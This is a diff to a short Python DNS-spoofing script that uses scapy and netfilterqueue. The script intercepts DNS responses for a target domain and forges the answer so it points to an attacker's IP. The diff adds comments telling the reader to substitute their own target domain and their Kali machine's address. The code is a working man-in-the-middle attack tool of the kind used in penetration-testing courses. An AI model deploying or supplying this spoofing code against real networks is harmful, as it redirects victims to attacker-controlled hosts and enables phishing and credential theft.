@@ -7,9 +7,10 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.httpforever.com" in qname:
+        if "www.httpforever.com" in qname:    # Replace the target domain with your own (example: "www.httpforever.com")
             print("[+] Spoofing  target")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.139")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.88.139")  # Replace the redirect IP with your Kali machine IP (example: "192.168.88.139")
+            
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -25,4 +26,5 @@ def process_packet(packet):
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
+
 queue.run()
